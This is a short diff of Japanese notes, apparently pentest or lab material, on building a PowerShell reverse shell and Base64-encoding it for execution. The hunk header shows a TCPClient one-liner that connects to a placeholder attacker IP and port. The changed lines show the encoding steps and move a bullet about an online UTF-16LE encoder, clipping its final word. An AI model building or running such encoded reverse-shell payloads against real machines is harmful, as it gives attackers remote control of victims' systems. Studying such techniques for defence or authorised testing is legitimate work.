@@ -189,11 +189,11 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("<attacker_IP>",<PORT
 - powershellの`-File`に指定してファイルとして実行する場合は、シングルクオートで囲った部分をps1ファイルとして保存すればよい
 
 3. Base64エンコードする
-	- [Base64 Encoder](https://www.base64encode.org/)を使う場合は、UTF-16LE(PowerShell対応の文字コード)を用いて、`$Text = ''`以外をエンコード
 ```powershell
 $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText =[Convert]::ToBase64String($Bytes)
 ```
+- [Base64 Encoder](https://www.base64encode.org/)を使う場合は、UTF-16LE(PowerShell対応の文字コード)を用いて、`$Text = ''`以外をエンコー
 
 4. エンコード結果を表示し、メモした後、PowerShellからexitする
 ```powershell
